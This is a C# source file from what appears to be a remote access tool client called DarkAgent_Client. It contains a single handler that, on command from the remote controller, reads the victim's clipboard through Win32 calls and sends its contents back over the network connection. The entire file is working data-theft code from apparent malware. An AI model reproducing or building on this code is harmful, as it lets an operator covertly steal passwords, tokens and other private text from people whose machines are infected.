using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;
using System.Runtime.InteropServices;
using System.Diagnostics;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_GetClipboard : ReceiveBasePacket
    {
        public R_GetClipboard(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        public override void Read()
        {
           
        }

        public override void Run()
        {
            APIs.OpenClipboard(Process.GetCurrentProcess().MainWindowHandle);
            IntPtr ClipboardDataPointer = APIs.GetClipboardData(1);
            UIntPtr Length = APIs.GlobalSize(ClipboardDataPointer);
            IntPtr gLock = APIs.GlobalLock(ClipboardDataPointer);
            byte[] Buffer = new byte[(int)Length];
            Marshal.Copy(gLock, Buffer, 0, (int)Length);
            APIs.CloseClipboard();
            Client.SendPacket(new S_GetClipboard(Client, Encoding.Default.GetString(Buffer)));
        }
    }
}
